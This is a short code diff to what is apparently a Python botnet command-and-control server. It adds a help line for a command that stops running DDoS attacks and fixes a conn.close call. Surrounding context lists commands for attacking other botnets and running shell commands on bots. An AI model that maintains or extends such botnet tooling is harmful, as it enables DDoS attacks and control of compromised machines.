@@ -101,6 +101,7 @@ def clientThread(conn):
 						conn.sendall("[?] >cnc [Target] [Port] [Amount of Connections] - This is an attack on other CNC Botnets\r\n")
 						conn.sendall("[?] >killbots - Disconnects all bots\r\n")
 						conn.sendall("[?] >shell [Command] - Allows the host to use commands from the bots terminal\r\n")
+						conn.sendall("[?] >killattk - Stops all on going DDoS attacks\r\n")
 						if rank.startswith(rankAdmin):
 							conn.sendall("\r\n")
 							conn.sendall("[>] Secret Admin Command [<]\r\n")
@@ -144,7 +145,7 @@ def clientThread(conn):
 				conn.close()
 			except:
 				clientDisconnect()
-				conn.close
+				conn.close()
 	except:
 		pass
 
